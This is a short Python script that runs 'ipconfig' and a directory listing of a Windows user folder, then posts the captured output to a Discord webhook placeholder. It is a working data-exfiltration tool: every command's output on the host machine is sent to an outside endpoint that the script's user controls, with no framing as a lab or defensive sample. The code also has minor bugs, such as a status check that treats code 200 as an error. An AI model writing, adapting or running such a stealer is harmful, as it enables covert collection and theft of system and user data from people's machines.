import requests as rq
import subprocess

webhook = "//your discord webhook here"

commands = {
    "ipconfig",
    "dir C:\\Users\\Usuario",
}

for commands in commands:
    system_data = subprocess.check_output(commands, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    str = system_data.decode("windows-1252")
    data = {
        "embeds": [{
            "title": "raw_data",
            "description": f"```{str}```",
            "color": 16711680
        }]
    }

    code = rq.post(webhook, json=data)
    if 200 < code.status_code < 300:
        print(f"data send successfully: {code.status_code}")
    else:
        print(f"ERROR: {code.status_code}")

